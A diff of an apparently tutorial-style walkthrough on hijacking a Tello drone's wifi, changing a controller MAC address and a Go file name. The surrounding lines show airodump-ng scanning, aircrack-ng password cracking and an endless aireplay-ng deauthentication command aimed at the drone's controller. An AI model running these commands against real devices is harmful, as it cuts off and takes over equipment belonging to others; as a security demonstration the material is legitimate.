@@ -84,7 +84,7 @@ root@kali:~/ggd# airodump-ng wlan0
                                                                                                                                                               
  BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                    
                                                                                                                                                                                                                                          
- 60:60:1F:D4:21:28  D4:61:9D:EE:49:2F  -32   54e-54e  5993    30022  TELLO-D42128                                                                                              
+ 60:60:1F:D4:21:28  A4:D9:31:D8:7D:8C  -32   54e-54e  5993    30022  TELLO-D42128                                                                                              
 ```
 
 Look for the network called `TELLO-D42128`, and make note of the `BSSID` (the Tello drone wifi access point MAC address), channel number and `STATION` (the controller's MAC address):
@@ -92,7 +92,7 @@ Look for the network called `TELLO-D42128`, and make note of the `BSSID` (the Te
 
 * WiFi channel: `3`
 * Tello drone MAC address: `60:60:1F:D4:21:28`
-* Controller (iPhone) MAC address: `D4:61:9D:EE:49:2F`
+* Controller (iPhone) MAC address: `A4:D9:31:D8:7D:8C`
 
 ### Step 2: Capture a handshake
 
@@ -126,7 +126,7 @@ aircrack-ng ggd-01.cap -w passwords.txt
 Deauthenticate the iPhone controller:
 
 ```
-aireplay-ng --deauth 0 -a 60:60:1F:D4:21:28 -c D4:61:9D:EE:49:2F wlan0
+aireplay-ng --deauth 0 -a 60:60:1F:D4:21:28 -c A4:D9:31:D8:7D:8C wlan0
 ```
 
 ### Step 5: Hijack the drone!
@@ -154,8 +154,8 @@ dhclient wlan0
 Then compile and run:
 
 ```
-go build hijack.go
-./hijack
+go build flip.go
+./flip
 ```
 
 
